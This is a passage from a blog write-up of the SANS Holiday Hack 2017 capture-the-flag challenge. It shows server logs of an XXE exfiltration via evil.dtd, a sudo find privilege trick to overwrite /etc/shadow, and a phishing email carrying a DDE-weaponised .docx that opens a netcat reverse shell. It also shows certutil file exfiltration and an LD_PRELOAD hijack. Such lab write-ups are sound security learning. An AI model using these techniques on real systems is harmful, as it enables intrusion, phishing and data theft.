&lt;span class="go"&gt;35.185.118.225 - - [29/Dec/2017:00:22:54 +0100] &amp;quot;GET /evil.dtd HTTP/1.1&amp;quot; 200 200 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;35.185.118.225 - - [29/Dec/2017:00:22:54 +0100] &amp;quot;GET /greatbook?http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf HTTP/1.1&amp;quot; 404 169 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Our payload work! We now have the content of &lt;code&gt;C:\greatbook.txt&lt;/code&gt;, which
is the URL &lt;a class="reference external" href="http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf"&gt;http://eaas.northpolechristmastown.com/xMk7H1NypzAqYoKw/greatbook6.pdf&lt;/a&gt;.
We can now download the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2017/greatbook6.pdf"&gt;sixth page of The Great Book&lt;/a&gt;
(sha256: &lt;code&gt;92dff9b155da22001dc72340791bde703fbf83bc0369e95aa9baea4ed5c36a84&lt;/code&gt;):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Dreaded Inter-Dimensional Tornadoes&lt;/p&gt;
&lt;p&gt;Throughout our recorded history, Oz has benefitted from quite favorable
weather, with frequent sunny days and a moderatly warm climate. Indeed, all
Munchkins enjoy essentially year-round springtime weather, keepking flowers
in bloom and making spirits bright.&lt;/p&gt;
&lt;p&gt;However, one type of weather phenomenon interrupts the otherwise beautiful
climate of Oz - the dreaded Inter-Dimensional Tornadoes - when the weather
outside is frightful. While quite rare, these ferocious storms appear
suddenly and without a warning, striking Oz every year or two. These
calamitous cyclones vary in intensity, but even the weakest have caused
significant damage, lifting houses off their foundations and shredding
everything in their deadly path, especially paper products.&lt;/p&gt;
&lt;p&gt;Inter-Dimensional Tornadoes get their unusual name because their intense
power has been known to rip holes into the very fabric of space and time,
allowing a single tornado to strike multiple different places in disparate
time eras simultaneously, interlinking each time and location touched by
the storm into a swirling inter-dimensional space-time vortex. Although the
specific physics of such storms remains elusive to our best scientists, one
thing is consistently observed by researchers and historians: When an
Inter-Dimensional Tornado strikes, it not only scatters whatever it has
vacuumed up throughout many lands, it sometimes also drops artifacts from
the past or even the future in its wake. Such storms have brought antique
watches, clothing, and curious gadgetry, lifting them from distant times
and far away places and depositing them in Oz.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="seventh-page-of-the-great-book"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id49"&gt;Seventh page of &lt;em&gt;The Great Book&lt;/em&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="north-pole-and-beyond-oh-wait-maybe-we-are"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id50"&gt;North Pole and Beyond: Oh wait! Maybe we are...&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="id12"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id51"&gt;Cranberry Pi&lt;/a&gt;&lt;/h4&gt;
&lt;pre class="literal-block"&gt;
              \ /
            --&amp;gt;*&amp;lt;--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /&amp;#64;\_\_\&amp;#64;\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/&amp;#64;/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/&amp;#64;/_/_/o/_/0/_\
   jgs       [___]
My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.
Restore /etc/shadow with the contents of /etc/shadow.bak, then run &amp;quot;inspect_da_box&amp;quot; to complete this challenge.
Hint: What commands can you run with sudo?
&lt;/pre&gt;
&lt;p&gt;We need to restore the content of &lt;code&gt;/etc/shadow.bak&lt;/code&gt; to &lt;code&gt;/etc/shadow&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The hint is a pretty big one. If you remember &lt;a class="reference external" href="/posts/2017/01/05/sans-christmas-challenge-2016/#sans-christmas-challenge-2016"&gt;last year's Christmas Challenge&lt;/a&gt;,
you remember that we can use &lt;code&gt;sudo -l&lt;/code&gt; to see what kind of command we
can execute:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@760499dcc4c9:~$&lt;/span&gt; sudo -l
&lt;span class="go"&gt;Matching Defaults entries for elf on 760499dcc4c9:&lt;/span&gt;
&lt;span class="go"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="go"&gt;User elf may run the following commands on 760499dcc4c9:&lt;/span&gt;
&lt;span class="go"&gt;    (elf : shadow) NOPASSWD: /usr/bin/find&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can execute &lt;code&gt;find&lt;/code&gt; as &lt;code&gt;elf:shadow&lt;/code&gt; (that is, as the user
&lt;code&gt;elf&lt;/code&gt;, member of the group &lt;code&gt;shadow&lt;/code&gt;, I didn't know this syntax).
Let's take a look at the permissions to our &lt;code&gt;shadow&lt;/code&gt; files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@760499dcc4c9:~$&lt;/span&gt; ls -lh /etc/shadow*
&lt;span class="go"&gt;-rw-rw---- 1 root shadow 677 Dec 23 23:59 /etc/shadow&lt;/span&gt;
&lt;span class="go"&gt;-rw------- 1 root root   652 Nov 14 13:48 /etc/shadow-&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 root root   677 Dec 15 19:59 /etc/shadow.bak&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that the &lt;code&gt;shadow&lt;/code&gt; group has write access to &lt;code&gt;/etc/shadow&lt;/code&gt;.
So, we need a way, by running &lt;code&gt;find&lt;/code&gt;, to copy the content from
&lt;code&gt;/etc/shadow.bak&lt;/code&gt; to &lt;code&gt;/etc/shadow&lt;/code&gt;. Luckily, &lt;code&gt;find&lt;/code&gt; has the
&lt;code&gt;-exec&lt;/code&gt; parameter, which can be used to execute command on the found
files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@760499dcc4c9:~$&lt;/span&gt; sudo -g shadow /usr/bin/find /etc -name shadow.bak -exec cp &lt;span class="o"&gt;{}&lt;/span&gt; /etc/shadow &lt;span class="se"&gt;\;&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt; /dev/null
&lt;span class="gp"&gt;elf@760499dcc4c9:~$&lt;/span&gt; inspect_da_box
&lt;span class="go"&gt;                     ___&lt;/span&gt;
&lt;span class="go"&gt;                    / __&amp;#39;.     .-&amp;quot;&amp;quot;&amp;quot;-.&lt;/span&gt;
&lt;span class="go"&gt;              .-&amp;quot;&amp;quot;-| |  &amp;#39;.&amp;#39;.  / .---. \&lt;/span&gt;
&lt;span class="go"&gt;             / .--. \ \___\ \/ /____| |&lt;/span&gt;
&lt;span class="go"&gt;            / /    \ `-.-;-(`_)_____.-&amp;#39;._&lt;/span&gt;
&lt;span class="go"&gt;           ; ;      `.-&amp;quot; &amp;quot;-:_,(o:==..`-. &amp;#39;.         .-&amp;quot;-,&lt;/span&gt;
&lt;span class="go"&gt;           | |      /       \ /      `\ `. \       / .-. \&lt;/span&gt;
&lt;span class="go"&gt;           \ \     |         Y    __...\  \ \     / /   \/&lt;/span&gt;
&lt;span class="go"&gt;     /\     | |    | .--&amp;quot;&amp;quot;--.| .-&amp;#39;      \  &amp;#39;.`---&amp;#39; /&lt;/span&gt;
&lt;span class="go"&gt;     \ \   / /     |`        \&amp;#39;   _...--.;   &amp;#39;---&amp;#39;`&lt;/span&gt;
&lt;span class="go"&gt;      \ &amp;#39;-&amp;#39; / jgs  /_..---.._ \ .&amp;#39;\\_     `.&lt;/span&gt;
&lt;span class="go"&gt;       `--&amp;#39;`      .&amp;#39;    (_)  `&amp;#39;/   (_)     /&lt;/span&gt;
&lt;span class="go"&gt;                  `._       _.&amp;#39;|         .&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;                     ```````    &amp;#39;-...--&amp;#39;`&lt;/span&gt;
&lt;span class="go"&gt;/etc/shadow has been successfully restored!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id13"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id52"&gt;Redirecting the snowball&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;No new object for this one!&lt;/p&gt;
&lt;img alt="oh_wait_maybe_we_are_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/oh_wait_maybe_we_are_terminal.png" /&gt;
&lt;p&gt;Here's the layout:&lt;/p&gt;
&lt;img alt="oh_wait_maybe_we_are_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/oh_wait_maybe_we_are_snowball.gif" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="north-pole-christmas-town-infrastructure-elf-machine-interface-server"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id53"&gt;North Pole Christmas Town infrastructure: Elf-Machine Interface server&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;The seventh question specifies that people use the Elf-Machine Interface server
to access email, and that we could get access to it via a phishing attack.&lt;/p&gt;
&lt;p&gt;Let's take a look at Alabaster's emails. First, the phishing scenario:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;From:&lt;/strong&gt; &lt;a class="reference external" href="mailto:alabaster.snowball&amp;#64;northpolechristmastown.com"&gt;alabaster.snowball&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To:&lt;/strong&gt; &amp;quot;&lt;a class="reference external" href="mailto:jessica.claus&amp;#64;northpolechristmastown.com"&gt;jessica.claus&amp;#64;northpolechristmastown.com&lt;/a&gt;&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subject:&lt;/strong&gt; gingerbread cookie recipe&lt;/p&gt;
&lt;p&gt;Hey Mrs Claus,&lt;/p&gt;
&lt;p&gt;Do you have that awesome gingerbread cookie recipe you made for me last
year? You sent it in a MS word .docx file. &lt;em&gt;I would totally open that
docx on my computer if you had that. I would click on anything with the
words gingerbread cookie recipe in it&lt;/em&gt;. I'm totally addicted and want to
make some more.&lt;/p&gt;
&lt;p&gt;Thanks,&lt;/p&gt;
&lt;p&gt;Alabaster Snowball&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;From:&lt;/strong&gt; &lt;a class="reference external" href="mailto:alabaster.snowball&amp;#64;northpolechristmastown.com"&gt;alabaster.snowball&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To:&lt;/strong&gt; &lt;a class="reference external" href="mailto:all&amp;#64;northpolechristmastown.com"&gt;all&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subject:&lt;/strong&gt; Re: COOKIES!&lt;/p&gt;
&lt;p&gt;Awesome, yea if anyone finds that .docx file containing the recipe for
&amp;quot;gingerbread cookie recipe&amp;quot;, please send it to me in a docx file. Im
currently working on my computer and would &lt;em&gt;totally download that to my
machine, open it, and click to all the prompts&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Thanks!&lt;/p&gt;
&lt;p&gt;Alabaster Snowball.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Oh, Alabaster, your gluttony will be your downfall. Now let's see how to
deliver our payload:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;From:&lt;/strong&gt; &lt;a class="reference external" href="mailto:minty.candycane&amp;#64;northpolechristmastown.com"&gt;minty.candycane&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To:&lt;/strong&gt; &lt;a class="reference external" href="mailto:all&amp;#64;northpolechristmastown.com"&gt;all&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subject:&lt;/strong&gt; Should we be worried?&lt;/p&gt;
&lt;p&gt;Hey Alabaster,&lt;/p&gt;
&lt;p&gt;You know I'm a novice security enthusiast, well I saw an article a while
ago about regarding DDE exploits that dont need macros for MS word to
get command execution.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/"&gt;https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Should we be worried about this?&lt;/p&gt;
&lt;p&gt;I tried it on my local machine and was able to transfer a file. Here's a
poc:&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="http://mail.northpolechristmastown.com/attachments/dde_exmaple_minty_candycane.png"&gt;http://mail.northpolechristmastown.com/attachments/dde_exmaple_minty_candycane.png&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I know your the resident computer engineer here so I wanted to defer to
the expert.&lt;/p&gt;
&lt;p&gt;:)&lt;/p&gt;
&lt;p&gt;-Minty CandyCane.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;From:&lt;/strong&gt; &lt;a class="reference external" href="mailto:alabaster.snowball&amp;#64;northpolechristmastown.com"&gt;alabaster.snowball&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To:&lt;/strong&gt; &lt;a class="reference external" href="mailto:all&amp;#64;northpolechristmastown.com"&gt;all&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subject:&lt;/strong&gt; Re: Should we be worried?&lt;/p&gt;
&lt;p&gt;Quit worrying Minty,&lt;/p&gt;
&lt;p&gt;You have nothing to worry about with me around! I have developed most of
the applications in our network including our network defenses. We are
are completely secure and impenetrable.&lt;/p&gt;
&lt;p&gt;Sincerely,&lt;/p&gt;
&lt;p&gt;Alabaster Snowball.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Oh, Alabaster, your hubris will &lt;strong&gt;also&lt;/strong&gt; be your downfall. And finally, what
payload can we use:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;From:&lt;/strong&gt; &lt;a class="reference external" href="mailto:alabaster.snowball&amp;#64;northpolechristmastown.com"&gt;alabaster.snowball&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To:&lt;/strong&gt; &lt;a class="reference external" href="mailto:all&amp;#64;northpolechristmastown.com"&gt;all&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subject:&lt;/strong&gt; Re: Lost book page&lt;/p&gt;
&lt;p&gt;Well powershell is my new love but netcat will always hold a special
place in my heart.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;From:&lt;/strong&gt; &lt;a class="reference external" href="mailto:alabaster.snowball&amp;#64;northpolechristmastown.com"&gt;alabaster.snowball&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To:&lt;/strong&gt; &lt;a class="reference external" href="mailto:all&amp;#64;northpolechristmastown.com"&gt;all&amp;#64;northpolechristmastown.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Subject:&lt;/strong&gt; Re: Lost book page&lt;/p&gt;
&lt;p&gt;I installed nc.exe to path for my computer.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Awesome, now we know that Alabaster has &lt;code&gt;nc.exe&lt;/code&gt; in his PATH. We can use
this tool to connect back to our Internet-facing machine, to get a shell access
to the Elf-Machine Interface server.&lt;/p&gt;
&lt;p&gt;Let's prepare our malicious .docx file, using the Sensepost tutorial:&lt;/p&gt;
&lt;img alt="ewa_malicious_docx.png" class="align-center" src="/images/sans-christmas-challenge-2017/ewa_malicious_docx.png" /&gt;
&lt;p&gt;Now, let's send our gingerbread cookie recipe to our dear Alabaster, from Mrs
Claus's account. We can do this by putting her email address in our cookie, as
explained in the EWA section:&lt;/p&gt;
&lt;img alt="ewa_phishing_email.png" class="align-center" src="/images/sans-christmas-challenge-2017/ewa_phishing_email.png" /&gt;
&lt;p&gt;And now, we wait for a shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; nc -knlvp &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;span class="go"&gt;listening on [any] 8080 ...&lt;/span&gt;
&lt;span class="go"&gt;connect to [X.X.X.X] from (UNKNOWN) [35.185.57.190] 52783&lt;/span&gt;
&lt;span class="go"&gt;Microsoft Windows [Version 10.0.14393]&lt;/span&gt;
&lt;span class="go"&gt;(c) 2016 Microsoft Corporation. All rights reserved.&lt;/span&gt;

&lt;span class="go"&gt;C:\Users\alabaster_snowball\Documents&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Sweet! We have a shell access to the EMI machine. Now, the only thing to do is
to get the &lt;code&gt;C:\GreatBookPage7.pdf&lt;/code&gt; file. But how to exfiltrate?
Exfiltrating data from a Windows machine can be a pain, since there's no
useful tools like &lt;code&gt;scp&lt;/code&gt;, &lt;code&gt;curl&lt;/code&gt;, etc. (yet) to send data to the
outside.  One of my favourite tricks is to use the &lt;code&gt;certutil.exe&lt;/code&gt; command
tool.  This tool is used to manipulate certificates, etc., but &lt;a class="reference external" href="https://twitter.com/subtee/status/920425668084510721"&gt;it can be used
to base64-encode and -decode data&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;So, what we'll do is simply base64 encode the page to a file. Then we'll output
the content of the file, copy/paste it to our machine, and base64-decode it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;C:\Users\alabaster_snowball\Documents&amp;gt; certutil.exe -f -encode C:\GreatBookPage7.pdf C:\Users\alabaster_snowball\Documents\GreatBookPage7.pdf.b64&lt;/span&gt;
&lt;span class="go"&gt;Input Length = 1053508&lt;/span&gt;
&lt;span class="go"&gt;Output Length = 1448634&lt;/span&gt;
&lt;span class="go"&gt;CertUtil: -encode command completed successfully.&lt;/span&gt;

&lt;span class="go"&gt;C:\Users\alabaster_snowball\Documents&amp;gt; type .\GreatBookPage7.pdf.b64&lt;/span&gt;
&lt;span class="go"&gt;-----BEGIN CERTIFICATE-----&lt;/span&gt;
&lt;span class="go"&gt;JVBERi0xLjMKJcTl8uXrp/Og0MTGCjUgMCBvYmoKPDwgL0xlbmd0aCA2IDAgUiAv&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;span class="go"&gt;RU9GCg==&lt;/span&gt;
&lt;span class="go"&gt;-----END CERTIFICATE-----&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then, on my machine (you must remove the &lt;code&gt;BEGIN CERTIFICATE&lt;/code&gt; and
&lt;code&gt;END CERTIFICATE&lt;/code&gt; from the output):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; base64 -d .&lt;span class="se"&gt;\G&lt;/span&gt;reatBookPage7.pdf.b64 &amp;gt; GreatBookPage7.pdf
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Which gives us the &lt;a class="reference external" href="/docs/sans-christmas-challenge-2017/GreatBookPage7.pdf"&gt;seventh page of The Great Book&lt;/a&gt;
(sha256: &lt;code&gt;bc93c535481abb76e3c5180406ea9ea0910acd53f76cab788f1d680d21b611b5&lt;/code&gt;):&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Regarding the Witches of Oz&lt;/p&gt;
&lt;p&gt;Of all the varied and amazing people who inhabit the Land of Oz, the
witches are among the most powerful, wielding potent magic and mesmerizing
spells. They travel through the air, propelled by bubbles or broomsticks.
Each witch has a very different attitude and outlook, ranging from faithful
friends who are dear to us all way down to hearts full of unwashed socks
and souls full of gunk.&lt;/p&gt;
&lt;p&gt;During the Great Schism, the witches very deliberately remained neutral,
siding with neither the Munchkins nor the Elves. The witches seem to live
exclusively in Oz, tending to their castles. As of this writing, the
witches have never been observed in the North Pole.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="who-is-behind-all-this"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id54"&gt;Who is behind all this?&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="north-pole-and-beyond-we-re-off-to-see-the"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id55"&gt;North Pole and Beyond: We're Off To See The...&lt;/a&gt;&lt;/h3&gt;
&lt;div class="section" id="id14"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id56"&gt;Cranberry Pi&lt;/a&gt;&lt;/h4&gt;
&lt;pre class="literal-block"&gt;
                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='
Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
&lt;/pre&gt;
&lt;p&gt;Alright, we have a program, and we need to make it return 42:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@ed587b205bb6:~$&lt;/span&gt; ls -lh
&lt;span class="go"&gt;total 100K&lt;/span&gt;
&lt;span class="go"&gt;-rwxr-xr-x 1 root root  83K Dec 16 16:56 isit42&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 root root  654 Dec 16 16:56 isit42.c.un&lt;/span&gt;
&lt;span class="gp"&gt;elf@ed587b205bb6:~$&lt;/span&gt; ./isit42
&lt;span class="go"&gt;Starting up ... done.&lt;/span&gt;
&lt;span class="go"&gt;Calling rand() to select a random number.&lt;/span&gt;
&lt;span class="go"&gt;170 is not 42.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ok, the program seems to generate a random number, using &lt;code&gt;rand()&lt;/code&gt;, and
compare the result to 42. If the random number is not equal to 42, the program
outputs an error. So, how can we force &lt;code&gt;rand&lt;/code&gt; to return 42?&lt;/p&gt;
&lt;p&gt;The common trick is to use &lt;code&gt;LD_PRELOAD&lt;/code&gt;. If this shell variable holds
the path to a shared library, this library will be loaded before any other
library, include &lt;code&gt;libc&lt;/code&gt;. The idea is to create our own library, with
our own version of &lt;code&gt;rand&lt;/code&gt; that, for example, always return 42. Luckily
for us, a &lt;a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win"&gt;SANS blog post&lt;/a&gt;
was recently posted on the subject.&lt;/p&gt;
&lt;p&gt;The blog post focuses on the &lt;code&gt;usleep&lt;/code&gt; instead of &lt;code&gt;rand&lt;/code&gt;, but the
principle is the same. So, let's create our own &lt;code&gt;rand&lt;/code&gt; library!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@ed587b205bb6:~$&lt;/span&gt; cat &lt;span class="s"&gt;&amp;lt;&amp;lt;EOF &amp;gt; hijack_rand.c&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s"&gt; int rand()&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s"&gt; {&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s"&gt;     return 42;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s"&gt; }&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s"&gt;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s"&gt; EOF&lt;/span&gt;
&lt;span class="gp"&gt;elf@ed587b205bb6:~$&lt;/span&gt; cat hijack_rand.c
&lt;span class="go"&gt;int rand()&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;    return 42;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="gp"&gt;elf@ed587b205bb6:~$&lt;/span&gt; gcc -o hijack_rand.so -shared -fPIC ./hijack_rand.c
&lt;span class="gp"&gt;elf@ed587b205bb6:~$&lt;/span&gt; &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./hijack_rand.so&amp;quot;&lt;/span&gt; ./isit42
&lt;span class="go"&gt;Starting up ... done.&lt;/span&gt;
&lt;span class="go"&gt;Calling rand() to select a random number.&lt;/span&gt;
&lt;span class="go"&gt;                 .-.&lt;/span&gt;
&lt;span class="go"&gt;                .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______&lt;/span&gt;
&lt;span class="go"&gt;               /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |&lt;/span&gt;
&lt;span class="go"&gt;              /::::&amp;#39;();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||&lt;/span&gt;
&lt;span class="go"&gt;            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_&lt;/span&gt;
&lt;span class="go"&gt;        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |&lt;/span&gt;
&lt;span class="go"&gt;         \,`////&amp;quot;&amp;quot;&amp;quot;&amp;quot;\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |&lt;/span&gt;
&lt;span class="go"&gt;         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|&lt;/span&gt;
&lt;span class="go"&gt;          \/|(_) () (_)|\/&lt;/span&gt;
&lt;span class="go"&gt;            \   &amp;#39;()&amp;#39;   /            ______    _______  _______  ___      ___      __   __    ___   _______&lt;/span&gt;
&lt;span class="go"&gt;            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |&lt;/span&gt;
&lt;span class="go"&gt;          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|&lt;/span&gt;
&lt;span class="go"&gt;         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____&lt;/span&gt;
&lt;span class="go"&gt;        /  |o`&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;&amp;quot;`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |&lt;/span&gt;
&lt;span class="go"&gt;       `.__/     ()     \__.&amp;#39;      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |&lt;/span&gt;
&lt;span class="go"&gt;       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|&lt;/span&gt;
&lt;span class="go"&gt;       /  \|---|    |---|/  \&lt;/span&gt;
&lt;span class="go"&gt;       |  (|42 | () | DA|)  |       _   ___  _______&lt;/span&gt;
&lt;span class="go"&gt;       \  /;---&amp;#39;    &amp;#39;---;\  /      | | |   ||       |&lt;/span&gt;
&lt;span class="go"&gt;        `` \ ___ /\ ___ / ``       | |_|   ||____   |&lt;/span&gt;
&lt;span class="go"&gt;            `|  |  |  |`           |       | ____|  |&lt;/span&gt;
&lt;span class="go"&gt;      jgs    |  |  |  |            |___    || ______| ___&lt;/span&gt;
&lt;span class="go"&gt;       _._  |\|\/||\/|/|  _._          |   || |_____ |   |&lt;/span&gt;
&lt;span class="go"&gt;      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|&lt;/span&gt;
&lt;span class="go"&gt;      | \__.&amp;#39;    ||    &amp;#39;.__/ |&lt;/span&gt;
&lt;span class="go"&gt;       `---------&amp;#39;&amp;#39;---------`&lt;/span&gt;
&lt;span class="go"&gt;Congratulations! You&amp;#39;ve won, and have successfully completed this challenge.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id15"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id57"&gt;Redirecting the snowball&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Here's the layout I used to solve this level (I know, I got suuuper lazy, but
God bless this portal):&lt;/p&gt;
